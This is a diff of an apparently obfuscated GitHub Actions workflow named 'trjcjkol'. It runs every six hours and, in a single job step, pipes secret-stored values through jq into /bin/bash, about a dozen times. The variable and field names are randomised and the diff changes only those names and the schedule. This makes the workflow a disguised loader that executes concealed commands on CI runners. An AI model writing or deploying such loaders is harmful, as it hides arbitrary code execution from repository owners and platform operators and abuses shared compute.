@@ -1,31 +1,29 @@
 name: trjcjkol
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 0/6 * * *'
+    - cron: '40 5/6 * * *'
 
-jobs:  # 31970
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: trjcjkol
         env:
-          bw3: ${{ secrets.bw3 }}
+          mag31820: ${{ secrets.mag31820 }}
         run: |
-          echo $bw3 | jq -r .c26966 | /bin/bash
-          echo $ssv90870 | jq -r .ab37146 | /bin/bash
-          echo $lb135 | jq -r .tm58 | /bin/bash
-          echo $xcpig26300 | jq -r .i4 | /bin/bash
-          echo $wm503 | jq -r .znn68775 | /bin/bash
-          echo $j97 | jq -r .qxrg694 | /bin/bash
-          echo $d26226 | jq -r .yha31 | /bin/bash
-          echo $sqxf3 | jq -r .nzw201 | /bin/bash
-          echo $hoa38888 | jq -r .jrit59 | /bin/bash
-          echo $bgcey2199 | jq -r .h903 | /bin/bash
-          echo $c1751 | jq -r .nhyi2693 | /bin/bash
-          echo $bmz84 | jq -r .qipy2337 | /bin/bash
-          echo $dit1387 | jq -r .rdza91324 | /bin/bash
+          echo $mag31820 | jq -r .dd47 | /bin/bash
+          echo $pldy6192 | jq -r .pfx5168 | /bin/bash
+          echo $o71 | jq -r .jacj0712 | /bin/bash
+          echo $mklt9 | jq -r .oo1 | /bin/bash
+          echo $x3 | jq -r .uyjts623 | /bin/bash
+          echo $kzbuu38 | jq -r .aqny861 | /bin/bash
+          echo $owtij05949 | jq -r .rp8319 | /bin/bash
+          echo $lqcz63 | jq -r .xsv27458 | /bin/bash
+          echo $jcvdo64 | jq -r .tvu59028 | /bin/bash
+          echo $kwwm2449 | jq -r .pzgyv8959 | /bin/bash
+          echo $vcv7 | jq -r .r6784 | /bin/bash
+          echo $orlc75535 | jq -r .ehf45 | /bin/bash
+          echo $uw0181 | jq -r .nvqu453 | /bin/bash
 
